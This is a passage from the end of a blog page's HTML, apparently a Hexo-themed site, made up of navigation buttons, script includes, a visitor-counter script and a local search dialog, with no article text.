id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search..." type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
